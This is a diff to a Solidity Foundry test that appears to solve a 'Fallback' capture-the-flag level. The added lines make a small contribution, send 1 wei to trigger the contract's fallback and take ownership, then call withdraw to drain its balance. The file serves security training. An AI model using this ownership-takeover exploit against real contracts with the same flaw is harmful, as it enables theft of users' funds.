@@ -38,6 +38,13 @@ contract TestFallback is BaseTest {
 
         vm.startPrank(player);
 
+        level.contribute{value: 0.0001 ether}();
+
+        (bool sent, ) = address(level).call{value: 1}("");
+        require(sent, "Failed to send Ether to the level");
+
+        level.withdraw();
+
         vm.stopPrank();
     }
 }
